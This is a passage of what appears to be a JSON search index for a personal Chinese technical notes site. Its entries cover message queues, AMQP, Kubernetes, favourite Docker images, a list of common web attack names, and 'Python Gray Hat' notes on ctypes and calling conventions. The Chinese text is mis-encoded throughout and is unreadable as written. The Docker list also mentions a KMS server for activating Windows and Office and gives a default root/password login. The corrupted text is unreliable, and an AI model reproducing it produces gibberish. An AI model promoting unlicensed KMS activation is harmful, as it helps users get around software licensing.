æœ‰ä¼˜ç§€çš„ç¬¬ä¸‰æ–¹Kafka Webç®¡ç†ç•Œé¢Kafka-Managerï¼› åœ¨æ—¥å¿—é¢†åŸŸæ¯”è¾ƒæˆç†Ÿï¼Œè¢«å¤šå®¶å…¬å¸å’Œå¤šä¸ªå¼€æºé¡¹ç›®ä½¿ç”¨ï¼› åŠŸèƒ½æ”¯æŒï¼šåŠŸèƒ½è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ”¯æŒç®€å•çš„MQåŠŸèƒ½ï¼Œåœ¨å¤§æ•°æ®é¢†åŸŸçš„å®æ—¶è®¡ç®—ä»¥åŠæ—¥å¿—é‡‡é›†è¢«å¤§è§„æ¨¡ä½¿ç”¨ ç¼ºç‚¹ï¼š Kafkaå•æœºè¶…è¿‡64ä¸ªé˜Ÿåˆ—/åˆ†åŒºï¼ŒLoadä¼šå‘ç”Ÿæ˜æ˜¾çš„é£™é«˜ç°è±¡ï¼Œé˜Ÿåˆ—è¶Šå¤šï¼Œloadè¶Šé«˜ï¼Œå‘é€æ¶ˆæ¯å“åº”æ—¶é—´å˜é•¿ ä½¿ç”¨çŸ­è½®è¯¢æ–¹å¼ï¼Œå®æ—¶æ€§å–å†³äºè½®è¯¢é—´éš”æ—¶é—´ï¼› RabbitMQ RabbitMQ 2007å¹´å‘å¸ƒï¼Œæ˜¯ä¸€ä¸ªåœ¨AMQP(é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®)åŸºç¡€ä¸Šå®Œæˆçš„ï¼Œ å¯å¤ç”¨çš„ä¼ä¸šæ¶ˆæ¯ç³»ç»Ÿï¼Œæ˜¯å½“å‰æœ€ä¸»æµçš„æ¶ˆæ¯ä¸­é—´ä»¶ä¹‹ä¸€ã€‚ RabbitMQä¼˜ç‚¹ï¼š ç”±äºerlangè¯­è¨€çš„ç‰¹æ€§ï¼Œmq æ€§èƒ½è¾ƒå¥½ï¼Œé«˜å¹¶å‘ï¼› ååé‡åˆ°ä¸‡çº§ï¼ŒMQåŠŸèƒ½æ¯”è¾ƒå®Œå¤‡ å¥å£®ã€ç¨³å®šã€æ˜“ç”¨ã€è·¨å¹³å°ã€æ”¯æŒå¤šç§è¯­è¨€ã€æ–‡æ¡£é½å…¨ï¼› å¼€æºæä¾›çš„ç®¡ç†ç•Œé¢éå¸¸æ£’ï¼Œç”¨èµ·æ¥å¾ˆå¥½ç”¨ ç¤¾åŒºæ´»è·ƒåº¦é«˜ï¼› RabbitMQç¼ºç‚¹ï¼š erlangå¼€å‘ï¼Œå¾ˆéš¾å»çœ‹æ‡‚æºç ï¼ŒåŸºæœ¬åªä¾èµ–äºå¼€æºç¤¾åŒºçš„å¿«é€Ÿç»´æŠ¤å’Œä¿®å¤bugï¼Œä¸åˆ©äºåšäºŒæ¬¡å¼€å‘å’Œç»´æŠ¤ã€‚ RabbitMQç¡®å®ååé‡ä¼šä½ä¸€äº›ï¼Œè¿™æ˜¯å› ä¸ºä»–åšçš„å®ç°æœºåˆ¶æ¯”è¾ƒé‡ã€‚ éœ€è¦å­¦ä¹ æ¯”è¾ƒå¤æ‚çš„æ¥å£å’Œåè®®ï¼Œå­¦ä¹ å’Œç»´æŠ¤æˆæœ¬è¾ƒé«˜ã€‚ RocketMQ RocketMQå‡ºè‡ª é˜¿é‡Œå…¬å¸çš„å¼€æºäº§å“ï¼Œç”¨ Java è¯­è¨€å®ç°ï¼Œåœ¨è®¾è®¡æ—¶å‚è€ƒäº† Kafkaï¼Œå¹¶åšå‡ºäº†è‡ªå·±çš„ä¸€äº›æ”¹è¿›ã€‚ RocketMQåœ¨é˜¿é‡Œé›†å›¢è¢«å¹¿æ³›åº”ç”¨åœ¨è®¢å•ï¼Œäº¤æ˜“ï¼Œå……å€¼ï¼Œæµè®¡ç®—ï¼Œæ¶ˆæ¯æ¨é€ï¼Œæ—¥å¿—æµå¼å¤„ç†ï¼Œbinglogåˆ†å‘ç­‰åœºæ™¯ã€‚ RocketMQä¼˜ç‚¹ï¼š å•æœºååé‡ï¼šåä¸‡çº§ å¯ç”¨æ€§ï¼šéå¸¸é«˜ï¼Œåˆ†å¸ƒå¼æ¶æ„ æ¶ˆæ¯å¯é æ€§ï¼šç»è¿‡å‚æ•°ä¼˜åŒ–é…ç½®ï¼Œæ¶ˆæ¯å¯ä»¥åšåˆ°0ä¸¢å¤± åŠŸèƒ½æ”¯æŒï¼šMQåŠŸèƒ½è¾ƒä¸ºå®Œå–„ï¼Œè¿˜æ˜¯åˆ†å¸ƒå¼çš„ï¼Œæ‰©å±•æ€§å¥½ æ”¯æŒ10äº¿çº§åˆ«çš„æ¶ˆæ¯å †ç§¯ï¼Œä¸ä¼šå› ä¸ºå †ç§¯å¯¼è‡´æ€§èƒ½ä¸‹é™ æºç æ˜¯javaï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±é˜…è¯»æºç ï¼Œå®šåˆ¶è‡ªå·±å…¬å¸çš„MQï¼Œå¯ä»¥æŒæ§ RocketMQç¼ºç‚¹ï¼š æ”¯æŒçš„å®¢æˆ·ç«¯è¯­è¨€ä¸å¤šï¼Œç›®å‰æ˜¯javaåŠc++ï¼Œå…¶ä¸­c++ä¸æˆç†Ÿï¼› ç¤¾åŒºæ´»è·ƒåº¦ä¸€èˆ¬ æ²¡æœ‰åœ¨ mq æ ¸å¿ƒä¸­å»å®ç°JMSç­‰æ¥å£ï¼Œæœ‰äº›ç³»ç»Ÿè¦è¿ç§»éœ€è¦ä¿®æ”¹å¤§é‡ä»£ç  æ¶ˆæ¯é˜Ÿåˆ—é€‰æ‹©å»ºè®® Kafka Kafkaä¸»è¦ç‰¹ç‚¹æ˜¯åŸºäºPullçš„æ¨¡å¼æ¥å¤„ç†æ¶ˆæ¯æ¶ˆè´¹ï¼Œè¿½æ±‚é«˜ååé‡ï¼Œ ä¸€å¼€å§‹çš„ç›®çš„å°±æ˜¯ç”¨äºæ—¥å¿—æ”¶é›†å’Œä¼ è¾“ï¼Œé€‚åˆäº§ç”Ÿå¤§é‡æ•°æ®çš„äº’è”ç½‘æœåŠ¡çš„æ•°æ®æ”¶é›†ä¸šåŠ¡ã€‚ å¤§å‹å…¬å¸å»ºè®®å¯ä»¥é€‰ç”¨ï¼Œå¦‚æœæœ‰æ—¥å¿—é‡‡é›†åŠŸèƒ½ï¼Œè‚¯å®šæ˜¯é¦–é€‰kafkaäº†ã€‚ RocketMQ å¤©ç”Ÿä¸ºé‡‘èäº’è”ç½‘é¢†åŸŸè€Œç”Ÿï¼Œå¯¹äºå¯é æ€§è¦æ±‚å¾ˆé«˜çš„åœºæ™¯ï¼Œ å°¤å…¶æ˜¯ç”µå•†é‡Œé¢çš„è®¢å•æ‰£æ¬¾ï¼Œä»¥åŠä¸šåŠ¡å‰Šå³°ï¼Œåœ¨å¤§é‡äº¤æ˜“æ¶Œå…¥æ—¶ï¼Œåç«¯å¯èƒ½æ— æ³•åŠæ—¶å¤„ç†çš„æƒ…å†µã€‚ RoketMQåœ¨ç¨³å®šæ€§ä¸Šå¯èƒ½æ›´å€¼å¾—ä¿¡èµ–ï¼Œè¿™äº›ä¸šåŠ¡åœºæ™¯åœ¨é˜¿é‡ŒåŒ11å·²ç»ç»å†äº†å¤šæ¬¡è€ƒéªŒï¼Œ å¦‚æœä½ çš„ä¸šåŠ¡æœ‰ä¸Šè¿°å¹¶å‘åœºæ™¯ï¼Œå»ºè®®å¯ä»¥é€‰æ‹©RocketMQã€‚ RabbitMQ ç»“åˆerlangè¯­è¨€æœ¬èº«çš„å¹¶å‘ä¼˜åŠ¿ï¼Œæ€§èƒ½è¾ƒå¥½ï¼Œç¤¾åŒºæ´»è·ƒåº¦ä¹Ÿæ¯”è¾ƒé«˜ï¼Œä½†æ˜¯ä¸åˆ©äºåšäºŒæ¬¡å¼€å‘å’Œç»´æŠ¤ã€‚ ä¸è¿‡ï¼ŒRabbitMQçš„ç¤¾åŒºååˆ†æ´»è·ƒï¼Œå¯ä»¥è§£å†³å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°çš„bugã€‚ å¦‚æœä½ çš„æ•°æ®é‡æ²¡æœ‰é‚£ä¹ˆå¤§ï¼Œå°å…¬å¸ä¼˜å…ˆé€‰æ‹©åŠŸèƒ½æ¯”è¾ƒå®Œå¤‡çš„RabbitMQã€‚ å‚è€ƒ ç§’æ‡‚æ¶ˆæ¯é˜Ÿåˆ—MQï¼Œä¸‡å­—æ€»ç»“å¸¦ä½ å…¨é¢äº†è§£æ¶ˆæ¯é˜Ÿåˆ—MQ æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMQï¼‰åˆ°åº•èƒ½å¹²ä»€ä¹ˆï¼Ÿ æ·±å…¥æ¶ˆæ¯é˜Ÿåˆ—MQï¼Œçœ‹è¿™ç¯‡å°±å¤Ÿäº†ï¼","tags":"ä¸­é—´ä»¶","url":"/yq-doc-source-docs-Chaotic-middleware-Mq-index.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Mq-index.html"},{"title":"ä¸­é—´ä»¶","text":"æ¶ˆæ¯é˜Ÿåˆ— MQ åˆ†å¸ƒå¼é” Dubbo ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ å¼‚æ­¥ åŒæ­¥çš„äº‹ä»¶é©±åŠ¨è½¬ä¸ºå¼‚æ­¥çš„æ¶ˆæ¯é©±åŠ¨ è§£è—• ä¸åŒæŠ€æœ¯ã€ä¸åŒè¯­è¨€ä¹‹é—´ç³»ç»Ÿå¯¹æ¥ å‰Šå³° ç”¨ç¨³å®šçš„ç³»ç»Ÿèµ„æºå¤„ç†çªå‘çš„æµé‡å†²å‡»","tags":"ä¸­é—´ä»¶","url":"/yq-doc-source-docs-Chaotic-middleware-index.html","loc":"/yq-doc-source-docs-Chaotic-middleware-index.html"},{"title":"æ¶ˆæ¯é˜Ÿåˆ—","text":"rabbitmqåœ°å€: AMQP 0-9-1 Protocol æ­¤æ–‡ä¸»è¦ä»‹ç» AMQP (Advanced Message Queuing Protocol) åè®®: é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®® è®¾è®¡ç›®æ ‡: è®©æœåŠ¡ç«¯å¯é€šè¿‡åè®®ç¼–ç¨‹ ç»„æˆ: ç½‘ç»œåè®® æœåŠ¡ç«¯æœåŠ¡ åŒ…å«: é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®æ¨¡å‹(AMQ Model) ç½‘ç»œå±‚åè®®AMQP, è®©å®¢æˆ·ç«¯ç¨‹åºä¸å®ç°äº†AMQ Modelçš„æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡ AMQPåè®®æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶åè®®ï¼Œå…·æœ‰ä¸€äº›ç°ä»£ç‰¹æ€§: å¤šé€šé“ï¼ˆmulti-channelï¼‰ å¯åå•†ï¼ˆnegotiatedï¼‰ å¼‚æ­¥ å®‰å…¨ ä¾¿æº è¯­è¨€ä¸­ç«‹ é«˜æ•ˆ åŸºæœ¬çš„AMQPæ¨¡å‹: | Exchange Queue | å‘å¸ƒè€… -> | äº¤æ¢æœº -> Msg Queue | -> æ¶ˆè´¹è€… Publisher | | Consumer | AMQP Model | æ¶ˆæ¯ç”±äº¤æ¢æœºè·¯ç”±ç»™æ¶ˆæ¯é˜Ÿåˆ— æ²¡æ¥å¾—åŠçœ‹çš„ä¸€äº›æ–‡ç« :: ä¸€ç¯‡æ–‡ç« è®²é€å½»äº†AMQPåè®® AMQP åè®®è¯¦è§£ RabbitMQ MQTTåè®®å’ŒAMQPåè®® AMQP å…¥é—¨","tags":"ä¸­é—´ä»¶","url":"/yq-doc-source-docs-Chaotic-middleware-message-queue.html","loc":"/yq-doc-source-docs-Chaotic-middleware-message-queue.html"},{"title":"Kubernetes","text":"å®˜ç½‘ä¸»é¡µ: Kubernetes æ–‡æ¡£ é›†ç¾¤å®‰è£… k8sé›†ç¾¤æ¼”å˜: å•ä½“åº”ç”¨ --> å‰åç«¯åˆ†ç¦» --> å¾®æœåŠ¡ --> å®¹å™¨ï¼ˆè²Œä¼¼å•ä½“åº”ç”¨å°±æœ‰äº†ï¼‰ --> k8så®¹å™¨é›†ç¾¤ k8så¤§ä½“æ¶æ„: ingress ï¼ˆæµé‡è¿›å…¥ï¼‰ ingress pod (ä¸€èˆ¬æ˜¯nginxåˆ†å‘) front-end service (å‰ç«¯) backend service ï¼ˆåç«¯ï¼‰ pod1 pod2 pod5 çº¯å®¹å™¨é›†ç¾¤çš„é—®é¢˜ ä¸šåŠ¡å®¹å™¨æ•°é‡åºå¤§ï¼Œå“ªäº›å®¹å™¨éƒ¨ç½²åœ¨å“ªäº›èŠ‚ç‚¹ï¼Œä½¿ç”¨äº†å“ªäº›ç«¯å£ï¼Œå¦‚ä½•è®°å½•ã€ç®¡ç† è·¨ä¸»æœºé€šä¿¡ï¼Œå¤šä¸ªæœºå™¨ä¸­çš„å®¹å™¨ä¹‹é—´ç›¸äº’è°ƒç”¨å¦‚ä½•åšï¼Œiptablesè§„åˆ™æ‰‹åŠ¨ç»´æŠ¤ï¼Ÿ è·¨ä¸»æœºå®¹å™¨é—´äº’ç›¸è°ƒç”¨ï¼Œé…ç½®å¦‚ä½•å†™ï¼Ÿå†™æ­»å›ºå®šIP+ç«¯å£ï¼Ÿ å¦‚ä½•å®ç°ä¸šåŠ¡é«˜å¯ç”¨ï¼Ÿå¤šä¸ªå®¹å™¨å¯¹å¤–æä¾›æœåŠ¡å¦‚ä½•å®ç°è´Ÿè½½å‡è¡¡ï¼Ÿ å®¹å™¨çš„ä¸šåŠ¡ä¸­æ–­äº†ï¼Œå¦‚ä½•å¯ä»¥æ„ŸçŸ¥åˆ°ï¼Œæ„ŸçŸ¥åˆ°ä»¥åï¼Œå¦‚ä½•è‡ªåŠ¨å¯åŠ¨æ–°çš„å®¹å™¨ï¼Ÿ å¦‚ä½•å®ç°æ»šåŠ¨å‡çº§ä¿è¯ä¸šåŠ¡çš„è¿ç»­æ€§ï¼Ÿ é›†ç¾¤ç®¡ç† å› ä¸º çº¯å®¹å™¨é›†ç¾¤çš„é—®é¢˜ , æ‰€ä»¥æœ‰äº†é›†ç¾¤ç®¡ç†å·¥å…· Docker Swarm Mesos Google Kubernetes 2017å¹´å¼€å§‹ Kubernetes å‡­å€Ÿå¼ºå¤§çš„å®¹å™¨é›†ç¾¤ç®¡ç†åŠŸèƒ½ï¼Œé€æ­¥å æ®å¸‚åœºï¼Œç›®å‰åœ¨å®¹å™¨ç¼–æ’é¢†åŸŸä¸€æç‹¬ç§€ k8s æ¶æ„ åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œä¸¤ç±»è§’è‰² ç®¡ç†èŠ‚ç‚¹master å·¥ä½œèŠ‚ç‚¹worker(æˆ–è€…slave) æ¶æ„å›¾ k8s æ ¸å¿ƒç»„ä»¶ ä¸»è¦æ˜¯é’ˆå¯¹ç®¡ç†ç»“ç‚¹ ApiServer APJæœåŠ¡å™¨ï¼Œé›†ç¾¤èµ„æºè®¿é—®æ§åˆ¶å…¥å£ï¼Œæä¾›reStAPJåŠå®‰å…¨è®¿é—®æ§åˆ¶ ETCD åˆ†å¸ƒå¼é«˜æ€§èƒ½é”®å€¼æ•°æ®åº“ï¼Œå­˜å‚¨æ•´ä¸ªé›†ç¾¤çš„æ‰€æœ‰å…ƒæ•°æ® Scheduler è°ƒåº¦å™¨ï¼Œè´Ÿè´£æŠŠä¸šåŠ¡å®¹å™¨è°ƒåº¦åˆ°æœ€åˆé€‚çš„NodeèŠ‚ç‚¹ Controller Manager æ§åˆ¶å™¨ç®¡ç†ï¼Œç¡®ä¿é›†ç¾¤èµ„æºæŒ‰ç…§æœŸæœ›çš„æ–¹å¼è¿è¡Œ Replication Controller Node controller ResourceQuota Controller Namespace Controller ServiceAccount Controller Token Controller Service Controller Endpoints Controller kubelet è¿è¡Œåœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„ä¸»è¦çš„\"èŠ‚ç‚¹ä»£ç†\"ï¼Œè„æ´»ç´¯æ´»(Dockerä¸»è¦æ˜¯åœ¨è¿™) pod ç®¡ç† kubelet å®šæœŸä»æ‰€ç›‘å¬çš„æ•°æ®æºè·å–èŠ‚ç‚¹ä¸Špod/container çš„ æœŸæœ›çŠ¶æ€ï¼ˆè¿è¡Œä»€ä¹ˆå®¹å™¨ã€è¿è¡Œçš„å‰¯æœ¬æ•°é‡ã€ç½‘ç»œæˆ–è€…å­˜å‚¨å¦‚ä½•é…ç½®ç­‰ç­‰ï¼‰ï¼Œ å¹¶è°ƒç”¨å¯¹åº”çš„å®¹å™¨å¹³å°æ¥å£è¾¾åˆ°è¿™ä¸ªçŠ¶æ€ã€‚ å®¹å™¨å¥åº·æ£€æŸ¥ kubelet åˆ›å»ºäº†å®¹å™¨ä¹‹åè¿˜è¦æŸ¥çœ‹å®¹å™¨æ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œ å¦‚æœå®¹å™¨è¿è¡Œå‡ºé”™ï¼Œå°±è¦æ ¹æ® pod è®¾ç½®çš„é‡å¯ç­–ç•¥è¿›è¡Œå¤„ç†. å®¹å™¨ç›‘æ§ kubelet ä¼šç›‘æ§æ‰€åœ¨èŠ‚ç‚¹çš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œå¹¶å®šæ—¶å‘ master æŠ¥å‘Šï¼Œ èµ„æºä½¿ç”¨æ•°æ®éƒ½æ˜¯é€šè¿‡ GAdvisor è·å–çš„ã€‚ çŸ¥é“æ•´ä¸ªé›†ç¾¤æ‰€æœ‰èŠ‚ç‚¹çš„èµ„æºæƒ…å†µï¼Œå¯¹äº pod çš„è°ƒåº¦å’Œæ­£å¸¸è¿è¡Œè‡³å…³é‡è¦ kube-proxy ç»´æŠ¤èŠ‚ç‚¹ä¸­çš„iptablesæˆ–è€…ipvsè§„åˆ™ Kubectl å‘½ä»¤è¡Œæ¥å£ï¼Œç”¨äºå¯¹ Kubernetes é›†ç¾¤è¿è¡Œå‘½ä»¤ https://kubernetes.io/zh/docs/reference/kubect!/ å·¥ä½œæµç¨‹","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-K8S-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-K8S-index.html"},{"title":"å¥½ç”¨çš„dockerä»“åº“","text":"â­ï¸ webmin , æ§åˆ¶é¢æ¿ â­ï¸ jellyfin , åª’ä½“æœåŠ¡å™¨ aliyun-webdav, é˜¿é‡Œäº‘ç›˜webdva â­ï¸ ariangï¼šä¸‹è½½æœº emqx ï¼šMqttæœåŠ¡ä¸­å¿ƒï¼Œå·¥ä½œç¯å¢ƒå¶å°”ç”¨ kmsï¼šæœåŠ¡å™¨ æ¿€æ´»è‡ªå·±å’Œæœ‹å‹çš„windows+office nastools ï¼šç®¡ç†ç•Œé¢ï¼ˆä¸å¥½ç”¨ï¼ŒåºŸå¼ƒæ‰ï¼‰ onthing ï¼šç½‘å¿ƒäº‘ï¼Œå¸¦å®½èµšé’±ï¼ˆåºŸå¼ƒæ‰ï¼Œä¸ç¼ºè¿™æ¯å¤©2å—é’±ï¼‰ â­ï¸ photoprism ï¼šç…§ç‰‡ç®¡ç†å·¥å…·ï¼Œå¯ä»¥ä¸Šä¼ ç…§ç‰‡ï¼Œä½†æ²¡å¿…è¦ ftp ï¼šå¼€å¯ftpæœåŠ¡å™¨ï¼ˆä¸å¸¸ç”¨ï¼‰ nginx ï¼šéƒ¨ç½²é¡¹ç›®ï¼Œä»£ç†ä¸€äº›æœ¬åœ°æ–‡ä»¶ â­ï¸ autoBangumi ï¼šè‡ªåŠ¨è¿½ç•ª arsenalï¼ˆæ­¦å™¨åº“ï¼‰ï¼š æä¾›ä¸€ä¸ªwebhookï¼Œè°ƒç”¨å³å¯å‘é€é‚®ä»¶ï¼Œç”¨è‡ªå·±çš„åŸŸåå‘é€ï¼Œæ¥å…¥é˜¿é‡Œäº‘DDNSåŠŸèƒ½ webmin æ§åˆ¶é¢æ¿, æ‹‰å–: docker pull johanp/webmin é»˜è®¤é…ç½®: Username: root Password: password hubdockeråœ°å€: johanp/webmin è¿˜æœ‰sambaç®¡ç†, bind ( /docs/æ‚ä¹±æ— ç« /è®¡ç®—æœºç½‘ç»œ/config_dns/docker-bindéƒ¨ç½²dns-ç®¡ç†é¢æ¿ ) ç­‰ç›¸å…³çš„ jellyfin åª’ä½“æœåŠ¡å™¨ æ‹‰å–: docker pull linuxserver/jellyfin åœ°å€: linuxserver/jellyfin","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-The-easy-to-use-Docker-warehouse.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-The-easy-to-use-Docker-warehouse.html"},{"title":"dockerä»“åº“","text":"./docker_store","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker-warehouse.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker-warehouse.html"},{"title":"ä»“åº“æœé›†","text":"mysql","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-index.html"},{"title":"docker","text":"dockerç®€ä»‹ dockerä½¿ç”¨ dockerå®‰è£…kali dockerå¸¸ç”¨æŒ‡ä»¤ dockeré…ç½®é•œåƒ dockerå®¹å™¨åŒ–ä¸‹çš„åä½œ windowså®‰è£…Ubuntu dockerfileç¼–å†™ dockerä»“åº“ docker-compose ä¸€äº›å‘ å¥½ç”¨çš„dockerä»“åº“","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-index.html"},{"title":"nginx","text":"æ¦‚å¿µè¯¦è§£ æŒ‡ä»¤ é…ç½® ä¸å…¶ä»–äº§å“å¯¹æ¯” dockeréƒ¨ç½²nginx","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-nginx-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-index.html"},{"title":"å¸¸è§æ¼æ´","text":"SQLæ³¨å…¥ XSSæ”»å‡» CSRFæ”»å‡» DDoSæ”»å‡» DNSåŠ«æŒ JSONåŠ«æŒ æš´åŠ›ç ´è§£","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-index.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-index.html"},{"title":"Pythonç°å¸½å­","text":"å‰è¨€: æ­¤æ–‡æºäºä¹¦ç± Pythonç°å¸½å­ , ä¸è¿‡è¿™æœ¬ä¹¦æœ‰ç‚¹è€äº†, æ˜¯åŸºäº Python2.5 çš„, æˆ‘é˜…è¯»çš„æ—¶å€™å°½é‡è½¬æ¢ä¸º Python3 æ¥è®°å½•. å®‰è£…ç›¸å…³ Pythonå®‰è£…éƒ¨åˆ†è·³è¿‡. å¾ˆç®€å• 2024æ¨èå·¥å…·: Pycharm (åŸæ–‡æ˜¯Eclipse, å¾ˆå¼ºä½†æœ‰ç‚¹è¿‡æ—¶äº†) æœ€é‡è¦çš„åº“ Ctypes , å¯å‚è€ƒ: /docs/åç«¯/python/pythonæ ‡å‡†åº“/ctypes Ctypesä½¿ç”¨åŠ¨æ€åº“ ä½¿ç”¨ ctypes çš„ç¬¬ä¸€æ­¥å°±æ˜¯æ˜ç™½å¦‚ä½•è§£æå’Œè®¿é—®åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ã€‚ä¸€ä¸ª dynamically linked libraryï¼ˆè¢«åŠ¨æ€è¿æ¥çš„åº“ï¼‰å…¶å®å°±æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸è¿‡ä¸€èˆ¬è‡ªå·±ä¸è¿è¡Œï¼Œè€Œæ˜¯ç”±åˆ« çš„ç¨‹åºè°ƒç”¨æ‰§è¡Œã€‚ åœ¨ Windows ä¸Šå«åš dynamic link libraries ï¼ˆDLLï¼‰åŠ¨æ€é“¾æ¥åº“ ï¼Œ åœ¨ Linuxä¸Šå«åš shared objectsï¼ˆSOï¼‰å…±äº«åº“ ã€‚æ—  è®ºä»€ä¹ˆå¹³å°ï¼Œè¿™äº›åº“ä¸­çš„å‡½æ•°éƒ½å¿…é¡»é€šè¿‡å¯¼å‡ºçš„åå­—è°ƒç”¨ï¼Œ ä¹‹åå†åœ¨å†…å­˜ä¸­æ‰¾å‡ºçœŸæ­£çš„åœ°å€ã€‚æ‰€ä»¥æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¦è°ƒç”¨å‡½æ•°ï¼Œéƒ½å¿…é¡»å…ˆè§£æå‡ºå‡½æ•°åœ°å€ï¼Œ ä¸è¿‡ ctypes æ›¿æˆ‘ä»¬å®Œæˆäº†è¿™ä¸€æ­¥ã€‚ ctypes æä¾›äº†ä¸‰ç§æ–¹æ³•è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ï¼š cdll0 windllO oledll0 å®ƒä»¬çš„ä¸åŒä¹‹å¤„å°±åœ¨äºï¼Œå‡½æ•°çš„è°ƒç”¨æ–¹æ³•å’Œè¿”å›å€¼ã€‚ cdllOåŠ è½½çš„åº“ï¼Œå…¶å¯¼å‡ºçš„å‡½æ•°å¿…é¡»ä½¿ç”¨æ ‡å‡†çš„ cdedlè°ƒç”¨çº¦å®šã€‚ windI0æ–¹æ³•åŠ è½½çš„åº“ï¼Œå…¶å¯¼å‡ºçš„å‡½æ•°å¿…é¡»ä½¿ç”¨ stdcallè°ƒç”¨çº¦å®šï¼ˆWin32API çš„åŸç”Ÿçº¦å®šï¼‰ oledl0æ–¹æ³•å’ŒwindIlOç±»ä¼¼ï¼Œä¸è¿‡å¦‚æœå‡½æ•°è¿”å›ä¸€ä¸ª HRESULTé”™è¯¯ä»£ç ï¼Œå¯ä»¥ä½¿ç”¨COMå‡½æ•°å¾—åˆ°å…·ä½“çš„é”™è¯¯ä¿¡æ¯ã€‚ è°ƒç”¨çº¦å®š è°ƒç”¨çº¦å®šä¸“æŒ‡å‡½æ•°çš„è°ƒç”¨æ–¹æ³•ã€‚ å…¶ä¸­åŒ…æ‹¬ï¼Œå‡½æ•°å‚æ•°çš„ä¼ é€’æ–¹æ³•ï¼Œé¡ºåºï¼ˆå‹å…¥æ ˆæˆ–è€…ä¼ ç»™å¯„å­˜å™¨ï¼‰ï¼Œ ä»¥åŠå‡½æ•°è¿”å›æ—¶ï¼Œæ ˆçš„å¹³è¡¡å¤„ç†ã€‚ ä¸‹é¢è¿™ä¸¤ç§çº¦å®šæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„ï¼š cdecl : cdecl è°ƒç”¨çº¦å®šï¼Œå‡½æ•°çš„å‚æ•°ä»å³å¾€å·¦ä¾æ¬¡å‹å…¥æ ˆå†…ï¼Œ å‡½æ•°çš„è°ƒç”¨è€…ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œè´Ÿè´£å‡½æ•°çš„å¹³è¡¡ã€‚è¿™ç§çº¦å®šå¸¸ç”¨äºx86 æ¶æ„çš„Cè¯­è¨€é‡Œã€‚ stdcall cdecl ä¾‹å­: InC : int python_rocksï¼ˆreason_one, reason_two, reason_threeï¼‰ï¼› In x86 Assembly : push reason_three push reason_two push reason_one call python_rocks add esp, 12 ä»ä¸Šé¢çš„æ±‡ç¼–ä»£ç ä¸­ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹å‡ºå‚æ•°çš„ä¼ é€’é¡ºåºï¼Œæœ€åä¸€è¡Œï¼Œæ ˆæŒ‡é’ˆå¢åŠ äº† 12 ä¸ªå­—èŠ‚ï¼ˆä¸‰ä¸ªå‚æ•°ä¼ é€’ä¸ªå‡½æ•°ï¼Œæ¯ä¸ªè¢«å‹å…¥æ ˆçš„æŒ‡é’ˆéƒ½å  4 ä¸ªå­—èŠ‚ï¼Œå…±12ä¸ªï¼‰ï¼Œ ä½¿å¾—å‡½æ•°è°ƒç”¨ä¹‹åçš„æ ˆæŒ‡é’ˆæ¢å¤åˆ°è°ƒç”¨å‰çš„ä½ç½®ã€‚ ä¸‹é¢æ˜¯ä¸ª stdcall è°ƒç”¨ çº¦å®šçš„äº†ä¾‹å­ï¼Œç”¨äº Win32 APIã€‚ InC : int my_socksï¼ˆcolor_one color_two, color_threeï¼‰ï¼› In x86 Assembly : push color_three push color_two push color_one call my_socks è¿™ä¸ªä¾‹å­é‡Œï¼Œå‚æ•°ä¼ é€’çš„é¡ºåºä¹Ÿæ˜¯ä»å³åˆ°å·¦ï¼Œ ä¸è¿‡æ ˆçš„å¹³è¡¡å¤„ç†ç”±å‡½æ•° my_socksè‡ªå·±å®Œæˆï¼Œè€Œä¸æ˜¯è°ƒç”¨è€…(æ²¡æœ‰ esp(æ ˆé¡¶æŒ‡é’ˆ) è°ƒæ•´æŒ‡é’ˆ)ã€‚ æœ€åä¸€ç‚¹ï¼Œ è¿™ä¸¤ç§è°ƒç”¨æ–¹å¼çš„è¿”å›å€¼éƒ½å­˜å‚¨åœ¨ EAX ä¸­ ã€‚ æ„é€ Cæ•°æ®ç±»å‹ è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/ctypes è°ƒè¯•å™¨æ„é€  ç™½ç›’è°ƒè¯• æ­£å¸¸æºç å¼€å‘æ—¶, åˆ©ç”¨ç¼–è¾‘å™¨æ¯”å¦‚Pycharmè‡ªå¸¦çš„è°ƒè¯•å™¨è¿›è¡Œè°ƒè¯• é»‘ç›’è°ƒè¯• 